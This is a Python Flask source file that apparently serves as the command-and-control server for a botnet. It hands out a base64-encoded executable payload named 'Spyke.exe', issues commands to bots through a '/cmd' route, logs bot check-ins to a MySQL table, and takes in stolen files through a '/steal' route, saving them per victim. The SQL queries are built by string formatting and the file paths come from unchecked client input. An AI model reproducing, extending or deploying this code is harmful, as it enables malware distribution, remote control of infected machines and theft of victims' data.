import MySQLdb
from base64 import b64encode as b64en, b64decode as b64de
from flask import Flask, request
import time
import pathlib

app = Flask(__name__)
db = MySQLdb.connect(host="localhost",user="root",passwd="", db="botnet")

@app.route('/', methods=['GET','POST'])
def index():
	if request.method == 'GET':
		# uploading the payload
		fin = open('Spyke.exe','rb').read()
		return b64en(fin)
	else:
		cursor = db.cursor()
		try:
			cursor.execute("INSERT INTO bots(id,log) VALUES (\"{0}\", \"{1}\")".format(request.form['id'],request.form['log']))
			db.commit()
			return "OK"
		except Exception as e: 
			print(str(e) + " -> " + "\n\n" + str(request.values.to_dict(flat=False)))
			return "NOT OK"

@app.route('/cmd', methods=['GET'])
def command():
	return b64en(b'notepad.exe')
	
@app.route('/steal', methods=['POST'])
def steal():
	path = './Data/' + request.form['id']
	pathlib.Path(path).mkdir(parents=True, exist_ok=True) 
	
	contents = request.form['log'].split(':')
	contents[1] = contents[1].replace(' ','+')
	f1 = open(path+'/'+contents[0],'wb')
	f1.write(b64de(contents[1]))
	f1.close()
	return "OK"

if __name__ == "__main__":
	app.run(host="0.0.0.0", port=80)
